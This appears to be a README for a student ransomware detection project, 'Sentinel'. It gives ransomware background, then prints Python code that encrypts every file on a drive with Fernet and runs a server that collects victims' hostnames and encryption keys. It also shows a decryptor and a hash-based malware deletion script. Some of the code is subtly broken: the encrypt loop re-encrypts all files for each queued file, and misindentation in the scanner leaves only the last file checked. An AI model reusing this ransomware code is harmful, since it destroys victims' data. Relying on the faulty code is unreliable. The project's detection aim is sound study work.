# Sentinel
<img src="sentinel-shootas-blood-and-teef.gif" align="right" />

**Ransomware** is a type of `cryptovirology` that threatens to publish the victims personal data or permanently block access unless a ransome is *paid*.

**Cryptovirology** refers to the use of cryptography to devise particularly powerful malware, such as `ransomware` and `asymmetric backdoors`.

**Cryptography** and it's applications are *defensive* in nature and provide privacy, authentication and security to users. Cryptovirology employs a twist on cryptography showing that it can be used *offensively*.

In a properly implemented cryptoviral extortion attack, recovering the files without the decryption key is an intractable problem and difficult to trace digital currencies such as `PaysafeCard` or `Bitcoin` and other cryptocurrencies are used for the ransoms, making tracing and prosecuting the perpetrators difficult.

`Ransomware` attacks are typically carried out using a **Trojan** disguised as a legitimate file that the user is tricked into downloading or opening when it arrives as an *email attachment*, or *embedded link in a phishing email*.

## REQUIREMENTS

🌟 Before we start, let's install the packages via pip by running in the terminal (Python3 Modules required to run the script):

Example
>- pip install watchdog

:point_right: pandas

:point_right: os

:point_right: datetime

:point_right: thread

:point_right: queue

:point_right: fernet

:point_right: socket

:point_right: path

:point_right: tkinter

:point_right: watchdog


## THE PROCESSES INVOLVED IN A RANSOMWARE ATTACK

- Infection: Attackers deliver the malware Payload to the target.

- Security Key Exchange: Attackers are notified they have the victim.

- Encryption: Ransomware encrypts the victim's file.

- Extortion: Attacker sends the ransome note and payment request.

- Recovery/Restore: Payment is sent in exchange for the decryption key.


## TYPES OF RANSOMWARE

- Crypto Ransomware: This type of ransomware encrypts files on a computer so that the user looses access to essential files. This is the type to be used for this project.
Examples of CryptoRansomware:
>- BadRabbit
>- Cryptolocker
>- SamSam
>- Thanos

- Locker Ransomware: This type of ransomware locks victims out of their device and prevents them from using their device. 
Examples are:
>- NotPetya and Petya
>- Ryuk
>- WannaCry


# PROJECT PLAN

**PROJECT:** Ransomware to detect, decrypt and restore.
```
Step 1: Create a code for ransomware (Encryption).
To be able to detect, there has to be a running process, and an encrypted file/drive path containing files.
We will encrypt all files at a given directory and transmit the user's hostname and random 512 bit key back to the malware server.

Step 2: Detection.
Detection would work on identifying running malware processes based on file changes in the test machine. Other methods of detection includes:

>- Honeypots > Monitored traps for a defender often used as a decoy to lure cyber attackers, to detect, deflect, and study hacking attempts to gain unauthorized access to information systems.
>- ML >   Machine Learning
>- Signature > File Entrophy
>- File Hash Comparism

Step 3: Decryption and Recovery.
This step involves the decryptor asking the victim for the key that was generated on their device/machine. Only the hacker will have this key, so they must retrieve it from him/her. 
```
> Note: We know that there are libraries that uses the *AES* encryption with just a few function calls, but we are doing this manually.


# STEPS EXPLANATION
- **STEP 1:** 
    ## ENCRYPTION <img src="hacked.png" align="left" />
    >- :point_right: **Fetch files** to be encrypted from the specified drive (*In this case we specified a flash drive*).
    We'll use the os.walk() function from the os library, which, given a path, iterates over every possible path in the form of a tree, to get a list of the files         that need to be encrypted. 
    >- :point_right: After that, we **used pandas to specify unique extentions**.
    >- :point_right: **Obtain the drive's whole list of files along with their extensions**. To obtain a list of the files that require encryption, we'll use the os.walk() function from the os package, which, given a path, iterates through every potential path in the form of a tree. The following usage is described below:
    ```
    ListFiles = os.walk(str ('E:'))
    SplitTypes = []
    for walk_output in ListFiles:
        for file_name in walk_output[-1]:
            SplitTypes.append(str('.')+file_name.split(".")[-1])
    SplitTypes
    df = pd.DataFrame(SplitTypes, columns = ['extension_names'])
    ```
    >- :point_right: **Encryption:** Data encryption and decryption are made possible by Python's support for a cryptography module. The cryptography package's fernet module has built-in functions for generating keys, converting plaintext to ciphertext, and recovering plaintext from ciphertext using the encrypt and decrypt methods, respectively. The fernet module ensures that information encrypted with it cannot be changed or decrypted without the key.
    ```
    def encrypt(key):
    while q.not_empty:
        file = q.get()
        print(f'Encrypting {file}')
        print(f'{file} SUCCESSFULLY ENCRYPTED')   
        try:
            with open('thekey.key', 'wb') as thekey:
                thekey.write(key)
            for file in file_paths:
                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(contents_encrypted)
        except: # files with admin priviledges are skipped
            print('ENCRYPTION FAILED')
        q.task_done()
    ```
    
    >- :point_right:**server implementation:**
    This code creates a server that listens for incoming connections on the given IP address and port. When a client connects to the server, the server receives the hostname and key from the client and appends them to the encrypted_hosts.txt file. The server then closes the connection.
The socket module is imported to create a socket and bind it to the given IP address and port. The bind() method is used to bind the socket to the given IP address and port. The listen() method is used to start listening for incoming connections. The accept() method is used to accept the incoming connection and receive the hostname and key from the client. The recv() method is used to receive the data from the client and the decode() method is used to decode the data from bytes to a string. The write() method is used to write the hostname and key to the encrypted_hosts.txt file. The close() method is used to close the connection.
    The bit key that will be used to encrypt all files is first generated by the ransomware. It will then compile a list of all the necessary files and encrypt them all before sending the key and the hostname of the machine to the server.
    
    ```
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((ipaddr, port))
    print('Listening for connections.........')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')   
            break
        print('Connection completed and closed!')  
    ```

https://user-images.githubusercontent.com/96830808/204082752-fe52e5bf-5c1b-491d-9a31-c94f005e7132.mp4




https://user-images.githubusercontent.com/96830808/205639185-f08d8817-1551-45ba-9f47-7deb1f44bf81.mp4



- **STEP 2:**
    ## DETECTION
    >- :point_right: For detection, `Watchdog` — a software that keeps track of all file creation, modification (ENCRYPTION), renaming, deletion in a certain path—has been developed. Two of these features—file modification and renaming—will be used by us.

This is a script that appears to implement a file system event handler to detect changes to files in a given directory. It uses the watchdog library to monitor the file system and the prettytable library to create tables to display information about the detected events. It also has a list of file extensions that it considers to be associated with ransomware, which it uses to filter the events it processes.

The script sets up an event handler class that inherits from FileSystemEventHandler, and overrides the on_any_event method to handle all types of events. It also defines several other methods to handle specific types of events: on_created, on_deleted, on_modified, and on_moved.

The script also uses tkinter to create a GUI application with a tree view to display the detected events, a pygame mixer to play a sound when an event is detected, and the psutil library to display information about the system's CPU and memory usage. It also uses the queue module to communicate between the event handler and the GUI.

Finally, the script sets up an observer using the Observer class from the watchdog library, and starts the observer to begin monitoring the file system for changes.


https://user-images.githubusercontent.com/96830808/205476537-2ed8a910-90c0-4e65-bb07-3a758b7fb36e.mp4


- **STEP 3:**
    ## DECRYPTION AND RECOVERY
    >- :point_right: The decryptor's behavior is completely analogous to ransomware. Naturally, this decryptor is associated with the above mentioned ransomware. The code starts by creating a variable called key.
    
   This code is a decryption program that decrypts files on a machine using the Fernet algorithm from the cryptography module. It prompts the user to enter a secret key, checks if the key is correct, and then starts decrypting the files on the machine.

First, the code imports the necessary modules. The os module is used to walk the file system and get the file names. The threading module is used to create a thread for the decryption process. The queue module is used to store the files in a queue for the thread to process. The pandas module is used to create a DataFrame to store the file extensions. The Fernet class from the cryptography.fernet module is used to encrypt and decrypt the files.

Next, the code creates a queue to hold the files to be decrypted. It then walks the file system and gets the file names. It splits the file names by their extension and stores the extension names in a list. A DataFrame is created to store the extension names and the unique values are extracted from the DataFrame. The unique values are then used to create a list of file extensions to be encrypted.

The code then loops through the files in the file system and checks if their extension is in the list of encrypted extensions. If it is, the file is added to a list of files to be decrypted.

The decrypt() function is defined to decrypt the files. The function takes a secret key as input. It continues to process files in the queue until the queue is empty. For each file in the queue, it reads the encryption key from the thekey.key file, decrypts the file using the key, and writes the decrypted contents back to the file. If the file has admin privileges and cannot be decrypted, it skips the file.

The code then prompts the user to enter a secret key. It checks if the key is correct and exits if the key is incorrect. It then adds the files to be decrypted to the queue.
    
For each file, it attempts to open the file in binary mode, read its contents into a variable called contents, and then decrypt the contents using the Fernet class from the cryptography module, passing in secretkey as an argument. The decrypted contents are then written back to the file.

If any errors occur, such as if the files are not accessible due to admin privileges, a message is printed indicating that the decryption failed. After each iteration of the loop, the task_done() method of the q object is called. 

The except clause skips any files with admin priviledges because they are skipped before anything else happens.
 
    ```
    def decrypt(key):
    while q.not_empty:
        file = q.get()
        print(f'Decrypting {file}') 
        print(f'{file} SUCCESSFULLY DECRYPTED')
        try:
            with open('thekey.key', 'rb') as key:
                secretkey = key.read()
            if user_phrase == secret_phrase:    
                for file in file_paths:
                    with open(file, 'rb') as thefile:
                        contents = thefile.read()
                    contents_decrypted = Fernet(secretkey).decrypt(contents)
                    with open(file, 'wb') as thefile:
                        thefile.write(contents_decrypted)
        except: # files with admin priviledges are skipped
            print('DECRYPTION FAILED')
        q.task_done()
    ```


# LIMITATIONS
- We did not disclose in details how the python script can be converted into exe as it is just a *proof of concept.*
- Another way to detect is to use this script: **READ THE COMMENTS TO GUIDE YOU**
The script below is designed to detect and delete malware on a drive by computing the hashes of the files on the drive using a specified set of hash algorithms and comparing them against a pre-determined list of known malware hashes.

The script begins by importing the necessary libraries, including the os module, which provides functions for interacting with the operating system, the hashlib module, which provides functions for computing hashes of files, and the shutil module, which provides functions for copying and deleting files.

Next, the script sets the name of the drive to scan for malware and the list of hash algorithms to use for computing the hashes of the files on the drive. It then sets the path to the file containing the known malware hashes and reads these hashes into a list.

The script then iterates over the files on the specified drive, computing the hashes of each file using the specified algorithms. It then checks if any of these hashes are present in the list of known malware hashes, and if so, deletes the file.

Overall, this script uses a combination of file hashing and comparison against a known list of malware hashes to detect and delete malware on a drive.
```
#Import the necessary libraries
import os
import hashlib
import shutil

#Set the name of the drive and the list of hash algorithms to use
drive_name = "E:"
hash_algos = ["md5", "sha1", "sha256"]

#Set the path to the directory containing the malware hashes
hash_file_path = "./MD5 Hahses.txt"

#Read the malware hashes from the file
with open(hash_file_path, "r") as f:
    malware_hashes = [line.strip() for line in f]

#Iterate over the files on the drive
for root, dirs, files in os.walk(drive_name):
    for file in files:
        # Compute the hashes of the file using the specified algorithms
        file_path = os.path.join(root, file)
    with open(file_path, "rb") as f:
        file_hashes = [hashlib.new(algo, f.read()).hexdigest() for algo in hash_algos]
        # If any of the file hashes are in the list of malware hashes, delete the file
    if any(file_hash in malware_hashes for file_hash in file_hashes):
        os.remove(file_path)
#The malwares on the drive have now been detected and deleted.
```
- We could also have written a code to check for suspicious running processes and eliminate it once detected but it could be too late. 
- Tboy and I could have also included terminating suspicious processess when detected.

>- **NOTE:** SENTINEL DETECTS BEFORE THE DAMAGE IS DONE, It is not also possible to determine the speed at which malware operates. Malware is a type of software that is designed to cause harm to a computer system, and the speed at which it operates can vary depending on a number of factors, including the type of malware and the specifications of the system it is running on. In general, the speed at which malware operates is not a meaningful metric, as its primary goal is to cause harm rather than to perform a specific task quickly.

# REFERENCES
- [network chuck](https://github.com/atknfe/malware-networkchuck)
- [wiki](https://en.wikipedia.org/wiki/Ransomware)
